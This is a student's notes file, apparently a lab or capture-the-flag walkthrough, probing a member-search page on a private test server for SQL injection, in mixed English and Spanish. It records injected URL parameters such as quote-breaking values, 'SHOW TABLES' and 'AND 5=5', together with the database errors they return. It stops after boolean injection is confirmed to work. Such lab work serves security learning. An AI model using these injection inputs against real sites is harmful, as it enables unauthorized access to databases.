@@ -1,0 +1,94 @@
+BREACH 2 SQL INJECTION
+
+At http://10.13.200.178/?page=member
+i can search a member with his Id on a search bar with submit button.
+
+submit button calls GET to http://10.13.200.178/?page=member and with query id == input.
+At html code We can see a hidden input with name="page" value="member".
+And another one with name='id' and value='inputtextforIdsearch'
+At submit url is: http://10.13.200.178/?page=member&id=inputtext&Submit=Submit#
+output: 
+    Unknown column 'inputtext' in 'where clause'
+
+with id='as'
+output:
+    You have an error in your SQL syntax;
+    check the manual that corresponds to your MariaDB server version
+    for the right syntax to use near 'inputext' at line 1
+
+So its using MariaDB and not sanitizing output since they are raw MariaDb exceptions.
+So if i can put SQL syntax in id searchParam i can make an SQL injection.
+
+id='SHOW TABLES;'
+http://10.13.200.178/?page=member&id=%27SHOW%20TABLES%27&Submit=Submit#
+output:
+    You have an error in your SQL syntax; 
+    check the manual that corresponds to your MariaDB server version 
+    for the right syntax to use near 'SHOW TABLES' at line 1
+
+I think MariaDB is translating query 'id' value into a SQL statement.
+Exactly after the WHERE clause. So it must be doing some SELECT * FROM TABLES WHERE 'id-value-input'.
+So if i find a condition that prints something i could be on the right track.
+let's try with id=id>=0.
+SELECT * FROM TABLES WHERE id >= 0.
+Imaginando que la tabla tenga un id entero creciente para cada fila de la tabla.
+output: 
+    Unknown column 'id' in 'where clause' -> fuk
+
+The SQL Statement is more like this then:
+SELECT * FROM TABLES WHERE ID = 'id-value-input'.
+So id=1 must output something
+GET http://10.13.200.178/?page=member&id=1&Submit=Submit#
+output:
+    ID: 1 
+    First name: one
+    Surname : me
+
+GET http://10.13.200.178/?page=member&id=5&Submit=Submit#
+output:
+    ID: 5 
+    First name: Flag
+    Surname : GetThe
+
+Read: 
+    https://owasp.org/www-community/attacks/SQL_Injection
+
+Realized about AND & OR operator.
+For doing something like 
+
+SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';
+
+http://10.13.200.178/index.php?page=member&id="'1' AND 'a'='a'"&Submit=Submit#
+output:
+    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\"\'1\' AND \'a\'=\'a\'\"' at line 1
+
+let's test with some Blind SQL Injection.
+Is a type of SQL Injection attack that asks the database true or false questions 
+and determines the answer based on the applications response.
+let's test with more obvious tests.
+Read:
+    https://owasp.org/www-community/attacks/Blind_SQL_Injection
+
+http://10.13.200.178/?page=member&id=1 AND 5=5&Submit=Submit#       (Without quoting)
+Output:
+    ID: 1 AND 5=5 
+    First name: one
+    Surname : me
+the AND operator has been executed.
+
+A partir de ahora segun 
+https://owasp.org/www-community/attacks/Blind_SQL_Injection 
+dependemos de las limitaciones de permisos del servidor.
+
+Ahora a ser creativos en la inyección SQL.
+
+EXPLOIT=?????
+URL:            http://10.13.200.178/?page=member&id=EXPLOIT&Submit=Submit#
+SQL COMMAND:    SELECT * FROM TABLES WHERE id=EXPLOIT.
+* --> puede que estemos buscando campos especificos id, name, username.
+TABLES --> puede que no estemos buscando en todas las tablas.
+Hay que encontrar más info sobre qué tablas en MariaDB y las columnas de la tabla member (si existe).
+
+TESTED: id=1 OR name=will
+output: Unknown column 'name' in 'where clause'
+
